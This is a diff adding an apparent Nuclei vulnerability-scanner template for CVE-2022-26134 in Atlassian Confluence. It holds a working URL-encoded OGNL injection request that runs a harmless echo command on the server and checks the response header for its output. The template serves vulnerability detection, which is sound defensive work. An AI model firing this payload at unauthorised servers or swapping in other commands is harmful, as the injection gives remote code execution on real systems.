@@ -1,0 +1,29 @@
+id: cve-2022-26134
+info:
+  name: Atlassian Confluence Webwork OGNL Inject
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Atlassian Confluence Server has an OGNL injection vulnerability allowing authenticated users (and in some cases unauthenticated users) to execute arbitrary code on the Confluence server.
+  classification:
+    cve-id: CVE-2022-26134
+    cvss-score: 9.8
+  reference:
+    - https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
+  tags: code-execution
+
+http:
+  - raw:
+      - |
+        GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo%20TTTest%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Test-Response%22%2C%23a%29%29%7D/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "X-Test-Response: TTTest"
